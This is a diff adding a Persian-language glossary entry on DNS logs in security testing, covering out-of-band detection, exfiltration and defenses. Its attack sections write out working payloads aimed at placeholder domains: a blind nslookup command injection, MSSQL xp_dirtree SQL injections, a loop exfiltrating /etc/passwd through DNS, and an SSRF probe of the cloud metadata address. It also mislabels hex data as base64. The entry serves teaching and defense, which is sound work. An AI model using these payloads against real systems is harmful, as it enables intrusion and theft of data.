@@ -1,0 +1,272 @@
+---
+slug: "dns-log"
+term: "لاگ DNS"
+abbreviation: ""
+shortDefinition: "ثبت پرس‌وجوها و پاسخ‌های سیستم نام دامنه، نشان‌دهنده اینکه چه نام‌های دامنه‌ای جستجو شده‌اند، چه زمانی و توسط چه کسی. در تست امنیتی برای تشخیص آسیب‌پذیری‌های کور استفاده می‌شود."
+category: "تست امنیتی"
+tags: ["dns", "ثبت", "oob", "نظارت", "کور"]
+relatedTerms: ["dns", "out-of-band", "blind-ssrf", "vps"]
+language: "fa"
+hasTranslation: true
+translationSlug: "dns-log"
+difficulty: "intermediate"
+lastUpdated: "2026-02-26"
+sources:
+  - "https://www.cloudflare.com/learning/dns/what-is-dns/"
+---
+
+## تعریف کوتاه
+لاگ‌های DNS نشان می‌دهند چه نام‌های دامنه‌ای جستجو شده‌اند. در تست امنیتی، شما از سرور DNS خود استفاده می‌کنید و لاگ‌های آن را تماشا می‌کنید. وقتی سرور هدف your-unique-id.your-domain.com را جستجو می‌کند، آن جستجو در لاگ‌ها ظاهر می‌شود و ثابت می‌کند بهره‌برداری شما کار کرده است حتی اگر نمی‌توانید خروجی مستقیم ببینید.
+
+## تعریف کامل
+لاگ‌های DNS رکوردهایی از درخواست‌ها و پاسخ‌های رزولوشن DNS هستند که پرس‌وجوهای انجام شده توسط سیستم‌ها هنگام ترجمه نام دامنه به آدرس‌های IP را ثبت می‌کنند.
+
+**آنچه لاگ‌های DNS شامل می‌شوند:**
+- زمان‌مهر پرس‌وجو
+- IP منبع (چه کسی پرسید)
+- دامنه پرس‌وجو شده
+- نوع پرس‌وجو (A، AAAA، TXT و غیره)
+- پاسخ داده شده
+- زمان پاسخ
+
+**نمونه ورود لاگ DNS:**
+```
+2026-02-26 10:30:45 | منبع: 192.168.1.100 | پرس‌وجو: api.example.com | نوع: A | پاسخ: 93.184.216.34
+```
+
+**در تست امنیتی:**
+
+راه‌اندازی لاگر DNS خود:
+```
+your-domain.com → سرور VPS/DNS شما
+```
+
+در طول تست‌ها، از زیردامنه منحصر به فرد استفاده کنید:
+```
+test-abc123.your-domain.com
+```
+
+وقتی هدف آن را جستجو می‌کند، لاگ نشان می‌دهد:
+```
+پرس‌وجو از 54.12.34.56 برای test-abc123.your-domain.com
+```
+
+**ابزارهای محبوب:**
+- interactsh
+- Burp Collaborator
+- RequestBin
+- سرورهای DNS سفارشی (dnslib, python)
+
+## چرا مهم است
+**برای تست امنیتی:**
+- آسیب‌پذیری‌های کور را بدون خروجی مستقیم تشخیص می‌دهد
+- بهره‌برداری را در محیط‌های فیلتر شده تأیید می‌کند
+- زمانی که درخواست‌های HTTP مسدود هستند کار می‌کند
+- WAF و فیلترینگ را دور می‌زند
+- داده را از طریق کدگذاری زیردامنه تخلیه می‌کند
+
+**برای مدافعان:**
+- تلاش‌های تخلیه داده را تشخیص می‌دهد
+- سیستم‌های به خطر افتاده را شناسایی می‌کند
+- ارتباط C2 را نظارت می‌کند
+- اتصالات خارجی غیرمجاز را پیدا می‌کند
+
+## چگونه مهاجمان از آن استفاده می‌کنند (و تست اخلاقی)
+**تأیید SSRF کور:**
+
+```bash
+# بار تست
+POST /api/image-fetch
+{"url": "http://ssrf-test-xyz.your-domain.com/image.jpg"}
+
+# بررسی لاگ‌های DNS روی سرور شما
+$ tail -f /var/log/dns-queries.log
+پرس‌وجو از 52.1.2.3: ssrf-test-xyz.your-domain.com
+# SSRF تأیید شد! سرور جستجوی DNS انجام داد
+```
+
+**تخلیه داده از طریق DNS:**
+
+```bash
+# تزریق دستور کور
+; nslookup `whoami`.data.your-domain.com
+
+# لاگ DNS نشان می‌دهد:
+پرس‌وجو: root.data.your-domain.com
+# نام کاربری تخلیه شده: root
+```
+
+**SQL Injection OOB:**
+
+```sql
+-- تخلیه نام دیتابیس از طریق DNS
+'; DECLARE @db VARCHAR(100);
+SELECT @db = DB_NAME();
+EXEC('master..xp_dirtree "\\' + @db + '.sqli.your-domain.com\a"');--
+
+# لاگ DNS:
+پرس‌وجو: production_db.sqli.your-domain.com
+# نام دیتابیس: production_db
+```
+
+**کدگذاری پرس‌وجوی چندگانه:**
+
+```bash
+# تخلیه فایل حساس
+file_contents=$(cat /etc/passwd | base64)
+for chunk in $(echo $file_contents | fold -w 50); do
+  nslookup $chunk.exfil.your-domain.com
+done
+
+# لاگ‌های DNS فایل را در تکه‌ها دریافت می‌کنند
+```
+
+**راه‌اندازی لاگر DNS:**
+
+```python
+# لاگر DNS ساده
+from dnslib import DNSRecord, RR, QTYPE, A
+from dnslib.server import DNSServer
+import logging
+
+logging.basicConfig(level=logging.INFO)
+
+class DNSLogger:
+    def resolve(self, request, handler):
+        reply = request.reply()
+        qname = request.q.qname
+        
+        # ثبت پرس‌وجو
+        logging.info(f"پرس‌وجوی DNS: {qname} از {handler.client_address[0]}")
+        
+        # هر IP را برگردان (برای ثبت مهم نیست)
+        reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=0))
+        return reply
+
+server = DNSServer(DNSLogger(), port=53, address="0.0.0.0")
+server.start()
+```
+
+## چگونه تشخیص یا پیشگیری کنیم
+**پیشگیری (دفاعی):**
+
+**کنترل‌های شبکه:**
+```bash
+# مسدود کردن DNS خروجی به جز سرورهای مورد اعتماد
+iptables -A OUTPUT -p udp --dport 53 -d 8.8.8.8 -j ACCEPT
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+
+# استفاده از فایروال DNS
+# فقط سرورهای DNS سازمانی را مجاز کنید
+```
+
+**نظارت بر الگوهای DNS:**
+```python
+# هشدار در مورد الگوهای مشکوک
+def analyze_dns_query(query):
+    # زیردامنه به طور غیرعادی طولانی
+    if len(query) > 100:
+        alert("تخلیه داده احتمالی از طریق DNS")
+    
+    # زیردامنه تصادفی به نظر می‌رسد
+    if contains_base64_or_hex(query):
+        alert("داده کدگذاری شده در پرس‌وجوی DNS")
+    
+    # دامنه‌های OOB شناخته شده
+    if any(pattern in query for pattern in ['burpcollaborator', 'interact.sh']):
+        alert("دامنه تست امنیتی شناخته شده")
+    
+    # پرس‌وجوهای زیاد به یک دامنه ناشناخته
+    if query_frequency(domain) > 100:
+        alert("تونل‌زنی DNS احتمالی")
+```
+
+**تشخیص (به عنوان تست‌کننده، تماشای لاگ‌های خود):**
+
+**تحلیل آنچه می‌بینید:**
+```bash
+# بررسی لاگ‌ها
+grep "پرس‌وجو:" /var/log/dns.log
+
+# جستجوی الگوها:
+- IP منبع = IP سیستم هدف؟ (تأیید می‌کند از هدف می‌آید)
+- زمان‌بندی با تست شما مطابقت دارد؟ (همبستگی را تأیید می‌کند)
+- فرمت زیردامنه با بار مطابقت دارد؟ (تأیید می‌کند کار کرده)
+```
+
+**نظارت خودکار:**
+```bash
+# هشدار در مورد پرس‌وجوهای جدید
+tail -f /var/log/dns.log | while read line; do
+  echo "[$(date)] پرس‌وجوی DNS جدید شناسایی شد!"
+  echo $line
+  # ارسال اعلان
+done
+```
+
+## باورهای غلط رایج
+- "ثبت DNS نیاز به راه‌اندازی خاص دارد" - برای اکثر سرورها استاندارد است
+- "نمی‌توان داده زیادی از طریق DNS تخلیه کرد" - ۲۵۵ کاراکتر در هر برچسب، پرس‌وجوهای متعدد
+- "پرس‌وجوهای DNS رمزنگاری شده هستند" - معمولاً متن ساده (مگر DoH/DoT)
+- "مسدود کردن HTTP همه چیز را مسدود می‌کند" - DNS اغلب هنوز مجاز است
+- "لاگ‌های DNS مهم نیستند" - برای تشخیص بهره‌برداری‌های کور حیاتی هستند
+
+## مثال واقعی
+**تخلیه DNS در حمله APT**
+
+```bash
+# بدافزار داده‌های دزدیده شده را در پرس‌وجوهای DNS کدگذاری کرد
+# الگوی دیده شده در لاگ‌ها:
+
+54686973206973207365637265742064617461.exfil.attacker.com
+4d6f7265207365637265742064617461.exfil.attacker.com
+...
+
+# base64 رمزگشایی شد: "این داده مخفی است"
+# گیگابایت داده در هفته‌ها از طریق DNS تخلیه شد
+```
+
+**باگ بانتی - کشف SSRF کور**
+
+```bash
+# هدف: پلتفرم تجارت الکترونیک
+# ویژگی: واکشی تصویر محصول از URL
+
+# بار:
+POST /admin/fetch-image
+{"url": "http://ssrf-12345.researcher.com/image.jpg"}
+
+# لاگ DNS روی VPS محقق:
+[2026-02-26 10:30:12] پرس‌وجو از 54.xxx.xxx.xxx: ssrf-12345.researcher.com
+
+# SSRF کور تأیید شد!
+# تست بیشتر با سرویس متادیتا:
+{"url": "http://169.254.169.254/"}
+
+# اگر متادیتا قابل دسترسی باشد، لاگ DNS نشان می‌دهد:
+# (برخی پیاده‌سازی‌ها ابتدا پرس‌وجوی DNS انجام می‌دهند)
+```
+
+**SQLi کور از طریق DNS**
+
+```sql
+-- سناریوی تست نفوذ واقعی
+-- هدف: برنامه مراقبت بهداشتی
+-- آسیب‌پذیری: تزریق SQL کور در پارامتر جستجو
+
+-- بار:
+search=test'; 
+DECLARE @v VARCHAR(8000);
+SET @v = (SELECT TOP 1 table_name FROM information_schema.tables);
+EXEC('master..xp_dirtree "\\'+@v+'.sqli.tester.com\a"');--
+
+# لاگ DNS نشان داد:
+پرس‌وجو: patients.sqli.tester.com
+
+-- تزریق SQL تأیید شد
+-- نام جدول تخلیه شده: "patients"
+-- پرس‌وجوهای بعدی اطلاعات حساس بیشتری استخراج کردند
+```
+
+## اصطلاحات مرتبط
+DNS, Out-of-Band, Blind SSRF, VPS, Data Exfiltration
